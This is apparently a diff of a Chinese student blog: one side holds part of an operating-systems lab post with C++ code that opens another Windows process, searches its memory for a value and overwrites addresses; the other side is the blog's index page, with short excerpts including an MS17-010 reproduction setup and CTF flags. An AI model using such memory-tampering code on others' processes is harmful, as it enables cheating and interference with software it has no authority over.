+<p>可以看到，成功打开进程后，打印了进程使用的内存块信息，打印完成后选择要执行的功能。以下分别演示内存查询和内存修改。</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
+<p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
+<h2 id="源代码"><a class="header-anchor" href="#源代码"></a>源代码</h2>
+<p><em>readMemory.cpp</em></p>
+<pre><code>#include &quot;stdafx.h&quot;
+#include &lt;iostream&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;string&gt;
+#include &lt;list&gt;
+#include &lt;iomanip&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;psapi.h&gt;
+
+#define MAX_ADDR_NUM 1024
+using namespace std;
+#pragma comment(lib,&quot;psapi.lib&quot;)
+DWORD dwProcessId[1024], cbNeededProcess;
+
+list&lt;MEMORY_BASIC_INFORMATION&gt;	MemList ;
+SYSTEM_INFO systemInfo;
+MEMORYSTATUS memstatus;
+list&lt;DWORD&gt; AddrList;
+
+void getSystemInfo();
+void getProcessInfo();
+bool getMemoryBlock(DWORD dwProcessId);
+bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue);
+bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue);
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	cout&lt;&lt;&quot;--------系统及内存信息如下-------&quot;&lt;&lt;endl;
+	getSystemInfo();
+
+	//获取当前进程信息
+	cout&lt;&lt;endl&lt;&lt;&quot;-----------进程列表如下----------&quot;&lt;&lt;endl;
+	getProcessInfo();
+
+	DWORD pid;
+	while(TRUE){
+		pid=0;
+		cout&lt;&lt;&quot;输入你需要访问的进程PID号: &quot;;
+		cin&gt;&gt;pid;
+		if(!getMemoryBlock(pid)){
+			cout&lt;&lt;&quot;PID = &quot;&lt;&lt;(DWORD)pid&lt;&lt;&quot; 的进程打开失败!&quot;&lt;&lt;endl;
+		}else{
+			char c;
+			int mode = 0;
+			while(TRUE){
+				cout&lt;&lt;endl&lt;&lt;&quot;q: 返回&quot;&lt;&lt;endl&lt;&lt;&quot;s: 内存查询&quot;&lt;&lt;endl&lt;&lt;&quot;m: 内存修改&quot;&lt;&lt;endl;
+				cout&lt;&lt;&quot;输入功能对应的字母:&quot;;
+				cin&gt;&gt;c;
+				if(c=='q'){
+					break;
+				}
+				else if(c=='s'){
+					DWORD x;
+					cout&lt;&lt;&quot;输入查询的值：&quot;;
+					cin&gt;&gt;x;
+					if(!SearchProcessMemory(pid,x)){
+						cout&lt;&lt;&quot;查询失败!&quot;&lt;&lt;endl;
+					}else{
+						if(AddrList.size()==0){
+							cout&lt;&lt;&quot;未查到值为 &quot;&lt;&lt;(DWORD)x&lt;&lt;&quot; 的内存区域!&quot;&lt;&lt;endl;
+						}else{
+							cout&lt;&lt;&quot;共查到 &quot;&lt;&lt;AddrList.size()&lt;&lt;&quot;个地址&quot;&lt;&lt;endl;
+							list&lt;DWORD&gt;::iterator it;
+							int i=0;
+							for(it=AddrList.begin();it!=AddrList.end();it++){
+								printf(&quot;%d   0x%x \n&quot;,++i,(*it));
+							}
+						}
+					}
+				}
+				else if(c=='m'){
+					DWORD addr;
+					DWORD x;
+					cout&lt;&lt;&quot;要写入的内存地址(16进制)：&quot;&lt;&lt;endl;
+					cin&gt;&gt;hex&gt;&gt;addr;
+					// getchar();
+					cout&lt;&lt;&quot;要写入的值(10进制)：&quot;&lt;&lt;endl;
+					cin&gt;&gt;x;
+					if(ModifyProcessMemory(pid,(DWORD)addr,(DWORD)x)){
+						cout&lt;&lt;&quot;修改成功!&quot;&lt;&lt;endl;
+					}else{
+						cout&lt;&lt;&quot;修改失败!&quot;&lt;&lt;endl;
+					}
+				}
+			}
+		}
+		getProcessInfo();
+	}
+	return 0;
 }
-</style></noscript><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Dawnyh's Blog" type="application/atom+xml">
-</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">45</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">33</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">19</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> Link</span></a></div></div></div></div><div id="body-wrap"><div class="full_page" id="nav" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Dawnyh's Blog</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> Link</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="site-info"><h1 id="site_title">Dawnyh's Blog</h1><div id="site_subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/dawnyh99" target="_blank" title="Github"><i class="fa fa-github" aria-hidden="true"></i></a><a class="social-icon" href="mailto:1755936129@qq.com" target="_blank" title="Email"><i class="fa fa-envelope" aria-hidden="true"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss" aria-hidden="true"></i></a></div></div><div id="scroll_down"><i class="fa fa-angle-down scroll-down-effects"></i></div></div><main class="layout_page" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/07/20/%E5%B7%A5%E5%85%B7/docker/" title="docker 常用命令">docker 常用命令</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-07-20 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-07-20</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%B7%A5%E5%85%B7/docker/">docker</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/docker/">docker</a></span></div><div class="content">镜像管理
-配置镜像仓库的国内加速地址
-12345678# Ubuntu16.04+、Debian8+、CentOS7适用# 创建或修改daemon配置文件:/etc/docker/daemon.json,内容如下&#123;  "registry-mirrors": ["https://&lt;个人 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="MS17-010漏洞复现">MS17-010漏洞复现</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-07-18 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-07-18</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a></span></div><div class="content">复现环境
-靶机：Windows server 2012 R2 standard	(192.168.233.129)
-攻击机：Kali Linux	(192.168.233.128)
-步骤
-环境配置
-关闭靶机防火墙
 
-在window server 2012中启动Guest账号
-开始菜单 -&gt; 管 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/" title="Java-GUI编程">Java-GUI编程</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-07-10 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-07-10</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/GUI/">GUI</a></span></div><div class="content">swing
-JFrame – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。
-JPanel – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" title="Java网络编程">Java网络编程</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-07-08 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-07-08</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">SOCKET
-定义：socket即套接字，由 ip 地址和端口号两个部分组成
-123456789InetAddress类：public static InetAddress getByName(String host) //根据域名获取ip    public static InetAddress  ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/" title="操作系统实验——内存扫描器设计实现">操作系统实验——内存扫描器设计实现</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-06-19 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-06-19</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/">专业课</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%AE%9E%E9%AA%8C/">实验</a></span></div><div class="content">实验内容
-(1) 能直接从当前操作系统（或Windows操作系统或Linux操作系统）内存获取内存存储数据；
-(2) 能对获取的数据进行分析，包括内存结构、进程链表、页目录表结构、进程相关信息等；
-(3) 设计物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；
-(4) 设计物理内存数据 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/" title="指令集和操作系统位数">指令集和操作系统位数</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-06-10 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-06-10</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/">专业课</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></span></div><div class="content">指令集
-为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。
-X86和ARM
-完整的，复杂的指令集称作CISC (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/" title="ACTF校赛Web">ACTF校赛Web</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-06-05 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-06-05</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span></div><div class="content">Misc
-题目：签到
-flag值：ACTF{WeLc0mm_tO_acTf}
-关注公众号，回复“一句话”即可
-Crypto
-题目：Column Permutation Cipher
-flag值：actf{welcome_to_the_world_of_cryptography}
-列换位密码，用密码学 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/" title="Java 异常及处理">Java 异常及处理</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-05-16 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-05-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">分类
 
-异常的处理
-向上抛出（throws+异常类型）
-不处理异常，将异常抛出给调用者。
-throw  、throws
-（挖坑待填）
-就地捕获（try-catch-finally）
-当程序发生异常时，系统捕获异常，转而执行异常处理代码。
 
-可能出现异常的代码用try块括起来
-用catch块来捕获异常 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/" title="Ubuntu (20.04)虚拟机安装配置">Ubuntu (20.04)虚拟机安装配置</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-05-12 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-05-12</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/linux/">linux</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></span></div><div class="content">VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装open-vm-tools的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程
-换源
-Ubuntu安装好之后首先要做的就是换源，需要特别注意的一点是不要随便从一篇博客里复制粘贴源的地址到sources.li ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/" title="Java 抽象类和接口">Java 抽象类和接口</a><div class="article-meta-wrap"><time class="post-meta__date" title="发表于 2020-04-27 00:00:00"><i class="fa fa-calendar" aria-hidden="true"></i>2020-04-27</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">抽象类
-作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。
-抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。
-抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-fw fa-chevron-left" aria-hidden="true"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-fw fa-chevron-right" aria-hidden="true"></i></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Dawnyh</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives"><div class="headline">文章</div><div class="length_num">45</div></a></div><div class="card-info-data-item is-center">      <a href="/tags"><div class="headline">标签</div><div class="length_num">33</div></a></div><div class="card-info-data-item is-center">     <a href="/categories"><div class="headline">分类</div><div class="length_num">19</div></a></div></div><div class="card-info-bookmark is-center"><a class="bookmark button--primary button--animated" id="bookmark-it" href="javascript:;" title="加入书签" target="_self"><i class="fa fa-bookmark" aria-hidden="true"></i><span>加入书签</span></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/dawnyh99" target="_blank" title="Github"><i class="fa fa-github" aria-hidden="true"></i></a><a class="social-icon" href="mailto:1755936129@qq.com" target="_blank" title="Email"><i class="fa fa-envelope" aria-hidden="true"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss" aria-hidden="true"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fa fa-bullhorn card-announcement-animation" aria-hidden="true"></i><span>公告</span></div><div class="announcement_content">这个人很懒，什么也没留下~</div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fa fa-history" aria-hidden="true"></i><span>最新文章</span></div><div class="aside-recent-item"><div class="aside-recent-post"><a href="/2022/12/27/%E5%B7%A5%E5%85%B7/redis/"><div class="aside-post-title no-aside-cover"><div class="aside-post_title" href="/2022/12/27/%E5%B7%A5%E5%85%B7/redis/" title="Redis笔记">Redis笔记</div><time class="aside-post_meta post-meta__date" title="发表于 2022-12-27 00:00:00">2022-12-27</time></div></a></div><div class="aside-recent-post"><a href="/2022/11/03/%E6%9D%82%E8%AE%B0/%E5%B7%B2%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%EF%BC%89%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F/"><div class="aside-post-title no-aside-cover"><div class="aside-post_title" href="/2022/11/03/%E6%9D%82%E8%AE%B0/%E5%B7%B2%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%EF%BC%89%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F/" title="已安装程序（服务）的运行方式">已安装程序（服务）的运行方式</div><time class="aside-post_meta post-meta__date" title="发表于 2022-11-03 00:00:00">2022-11-03</time></div></a></div><div class="aside-recent-post"><a href="/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><div class="aside-post-title no-aside-cover"><div class="aside-post_title" href="/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="漏洞/Java反序列化漏洞">漏洞/Java反序列化漏洞</div><time class="aside-post_meta post-meta__date" title="发表于 2022-07-13 11:07:38">2022-07-13</time></div></a></div><div class="aside-recent-post"><a href="/2021/08/09/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"><div class="aside-post-title no-aside-cover"><div class="aside-post_title" href="/2021/08/09/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" title="密码算法">密码算法</div><time class="aside-post_meta post-meta__date" title="发表于 2021-08-09 00:00:00">2021-08-09</time></div></a></div><div class="aside-recent-post"><a href="/2021/07/26/%E5%B7%A5%E5%85%B7/git/"><div class="aside-post-title no-aside-cover"><div class="aside-post_title" href="/2021/07/26/%E5%B7%A5%E5%85%B7/git/" title="git笔记">git笔记</div><time class="aside-post_meta post-meta__date" title="发表于 2021-07-26 00:00:00">2021-07-26</time></div></a></div></div></div></div><div class="card-widget card-categories"><div class="card-content"><div class="item-headline"><i class="fa fa-folder-open" aria-hidden="true"></i><span>分类</span></div><ul class="card-category-list">
-            <li class="card-category-list-item"><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">8</span></a></li><ul class="card-category-list child"><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/CTF/web/"><span class="card-category-list-name">web</span><span class="card-category-list-count">5</span></a></li><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/CTF/%E6%9D%82%E9%A1%B9/"><span class="card-category-list-name">杂项</span><span class="card-category-list-count">1</span></a></li></ul><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/"><span class="card-category-list-name">专业课</span><span class="card-category-list-count">5</span></a></li><ul class="card-category-list child"><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/"><span class="card-category-list-name">密码学</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"><span class="card-category-list-name">操作系统</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/"><span class="card-category-list-name">计网</span><span class="card-category-list-count">2</span></a></li></ul><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/"><span class="card-category-list-name">工具</span><span class="card-category-list-count">7</span></a></li>
-            <li class="card-category-list-item more is-center"><a class="card-category-list-link-more" href="/categories">
-                <span>查看更多</span><i class="fa fa-angle-right" aria-hidden="true"></i></a></li>           
-            </ul></div></div><div class="card-widget card-tags"><div class="card-content"><div class="item-headline"><i class="fa fa-tags" aria-hidden="true"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 22px; color: #99a9bf">CTF</a> <a href="/tags/GUI/" style="font-size: 16px; color: #999">GUI</a> <a href="/tags/Java/" style="font-size: 18.4px; color: #999fa8">Java</a> <a href="/tags/Markdown/" style="font-size: 16px; color: #999">Markdown</a> <a href="/tags/Misc/" style="font-size: 16px; color: #999">Misc</a> <a href="/tags/Python/" style="font-size: 17.2px; color: #999ca1">Python</a> <a href="/tags/SSH/" style="font-size: 16px; color: #999">SSH</a> <a href="/tags/XSS/" style="font-size: 16px; color: #999">XSS</a> <a href="/tags/docker/" style="font-size: 16px; color: #999">docker</a> <a href="/tags/git/" style="font-size: 16px; color: #999">git</a> <a href="/tags/go/" style="font-size: 20.8px; color: #99a6b7">go</a> <a href="/tags/hexo/" style="font-size: 16px; color: #999">hexo</a> <a href="/tags/kafka/" style="font-size: 16px; color: #999">kafka</a> <a href="/tags/kali/" style="font-size: 16px; color: #999">kali</a> <a href="/tags/linux/" style="font-size: 18.4px; color: #999fa8">linux</a> <a href="/tags/mysql/" style="font-size: 16px; color: #999">mysql</a> <a href="/tags/redis/" style="font-size: 16px; color: #999">redis</a> <a href="/tags/sql/" style="font-size: 16px; color: #999">sql</a> <a href="/tags/sqli/" style="font-size: 16px; color: #999">sqli</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 16px; color: #999">代码审计</a> <a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 16px; color: #999">实验</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 16px; color: #999">密码学</a> <a href="/tags/%E5%B9%B6%E5%8F%91/" style="font-size: 16px; color: #999">并发</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 17.2px; color: #999ca1">操作系统</a> <a 